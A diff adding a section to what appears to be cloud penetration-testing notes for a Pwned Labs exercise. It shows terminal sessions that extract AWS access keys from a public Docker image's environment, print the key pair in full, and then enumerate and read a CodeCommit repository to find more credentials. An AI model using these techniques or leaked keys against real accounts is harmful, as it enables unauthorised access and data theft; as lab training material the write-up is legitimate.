@@ -1771,8 +1771,206 @@ This functions is vulnerable to an SSRF vulnerability. Exploit it with an LFI to
 
 ---
 
+You can use <a href="https://hub.docker.com/">Docker Hub</a> to search for docker images related to the target
+
+<p align="center">
+  <p><img width="60%" src="https://github.com/user-attachments/assets/00e60925-8cff-474c-893d-6059df86f98f"/>
+</p>
+
+Use the `Docker Scout` plugin for quick CVE analysis of the Docker image
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ sudo docker scout cves hljose/huge-logistics-terraform-runner:0.12
+    ✓ Image stored for indexing
+    ✓ Indexed 88 packages
+    ✗ Detected 17 vulnerable packages with a total of 83 vulnerabilities
 
 
+## Overview
+
+                    │                Analyzed Image                  
+────────────────────┼────────────────────────────────────────────────
+  Target            │  hljose/huge-logistics-terraform-runner:0.12   
+    digest          │  31bd0544dff8                                  
+    platform        │ linux/amd64                                    
+    vulnerabilities │    7C    24H    44M     8L     1?              
+    size            │ 62 MB                                          
+    packages        │ 88                                             
+
+
+## Packages and Vulnerabilities
+
+   2C     4H     9M     4L  curl 8.2.0-r0
+pkg:apk/alpine/curl@8.2.0-r0?os_name=alpine&os_version=3.18
+
+    ✗ CRITICAL CVE-2025-0665
+      https://scout.docker.com/v/CVE-2025-0665
+      Affected range : <8.12.0-r0  
+      Fixed version  : 8.12.0-r0   
+    
+    ✗ CRITICAL CVE-2023-38545
+      https://scout.docker.com/v/CVE-2023-38545
+<snip>
+   1C     3H    11M     0L  openssl 3.1.1-r1
+pkg:apk/alpine/openssl@3.1.1-r1?os_name=alpine&os_version=3.18
+
+    ✗ CRITICAL CVE-2024-5535
+      https://scout.docker.com/v/CVE-2024-5535
+      Affected range : <3.1.6-r0  
+      Fixed version  : 3.1.6-r0   
+<snip>
+```
+
+Interact with the Docker image with
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ sudo docker run -i -t hljose/huge-logistics-terraform-runner:0.12 /bin/bash
+5434198e53c7:/# uname -a
+Linux 5434198e53c7 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64 Linux
+```
+
+Either print the environmental variables from the shell or run `docker inspect` to find AWS credentials
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ sudo docker inspect hljose/huge-logistics-terraform-runner:0.12             
+[
+    {
+        "Id": "sha256:31bd0544dff85f0a97bd52a724215e77244733a3f51fe051928009da08df1de9",
+<snip>
+            "AttachStderr": false,
+            "Tty": false,
+            "OpenStdin": false,
+            "StdinOnce": false,
+            "Env": [
+                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+                "AWS_ACCESS_KEY_ID=AKIA3NRSK2PTOA5KVIUF",
+                "AWS_SECRET_ACCESS_KEY=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",
+                "AWS_DEFAULT_REGION=us-east-1"
+            ],
+<snip>
+```
+
+---
+
+Enumerating CodeCommit
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws-enumerator dump -services codecommit                        
+
+----------------------------- CODECOMMIT -----------------------------
+
+ListRepositories
+
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws codecommit list-repositories                                
+{
+    "repositories": [
+        {
+            "repositoryName": "vessel-tracking",
+            "repositoryId": "beb7df6c-e3a2-4094-8fc5-44451afc38d3"
+        }
+    ]
+}
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws codecommit get-repository --repository-name vessel-tracking 
+{
+    "repositoryMetadata": {
+        "accountId": "785010840550",
+        "repositoryId": "beb7df6c-e3a2-4094-8fc5-44451afc38d3",
+        "repositoryName": "vessel-tracking",
+        "repositoryDescription": "Vessel Tracking App",
+        "defaultBranch": "master",
+        "lastModifiedDate": 1689875446.826,
+        "creationDate": 1689801079.845,
+        "cloneUrlHttp": "https://git-codecommit.us-east-1.amazonaws.com/v1/repos/vessel-tracking",
+        "cloneUrlSsh": "ssh://git-codecommit.us-east-1.amazonaws.com/v1/repos/vessel-tracking",
+        "Arn": "arn:aws:codecommit:us-east-1:785010840550:vessel-tracking",
+        "kmsKeyId": "alias/aws/codecommit"
+    }
+}
+```
+
+Specific repository enumeration... The `fileContent` variable is base64-encoded. Decode it for AWS credentials
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws codecommit list-branches --repository-name vessel-tracking
+
+{
+    "branches": [
+        "master",
+        "dev"
+    ]
+}
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws codecommit get-branch --repository-name vessel-tracking --branch-name dev
+{
+    "branch": {
+        "branchName": "dev",
+        "commitId": "b63f0756ce162a3928c4470681cf18dd2e4e2d5a"
+    }
+}
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws codecommit get-commit --repository-name vessel-tracking --commit-id b63f0756ce162a3928c4470681cf18dd2e4e2d5a
+
+{
+    "commit": {
+        "commitId": "b63f0756ce162a3928c4470681cf18dd2e4e2d5a",
+        "treeId": "5718a0915f230aa9dd0292e7f311cb53562bb885",
+        "parents": [
+            "2272b1b6860912aa3b042caf9ee3aaef58b19cb1"
+        ],
+        "message": "Allow S3 call to work universally\n",
+        "author": {
+            "name": "Jose Martinez",
+            "email": "jose@pwnedlabs.io",
+            "date": "1689875383 +0100"
+        },
+        "committer": {
+            "name": "Jose Martinez",
+            "email": "jose@pwnedlabs.io",
+            "date": "1689875383 +0100"
+        },
+        "additionalData": ""
+    }
+}
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws codecommit get-differences --repository-name vessel-tracking --before-commit-specifier 2272b1b6860912aa3b042caf9ee3aaef58b19cb1 --after-commit-specifier b63f0756ce162a3928c4470681cf18dd2e4e2d5a
+{
+    "differences": [
+        {
+            "beforeBlob": {
+                "blobId": "4381be5cc1992c598de5b7a6b73ebb438b79daba",
+                "path": "js/server.js",
+                "mode": "100644"
+            },
+            "afterBlob": {
+                "blobId": "39bb76cad12f9f622b3c29c1d07c140e5292a276",
+                "path": "js/server.js",
+                "mode": "100644"
+            },
+            "changeType": "M"
+        }
+    ]
+}
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws codecommit get-file --repository-name vessel-tracking --commit-specifier b63f0756ce162a3928c4470681cf18dd2e4e2d5a --file-path js/server.js
+{
+    "commitId": "b63f0756ce162a3928c4470681cf18dd2e4e2d5a",
+    "blobId": "39bb76cad12f9f622b3c29c1d07c140e5292a276",
+    "filePath": "js/server.js",
+    "fileMode": "NORMAL",
+    "fileSize": 1702,
+    "fileContent": "Y29uc3QgZXhwcmVzcyA9IHJlcXVpcmUoJ2V4cHJlc
+<snip>
+```
+
+---
 
 
 
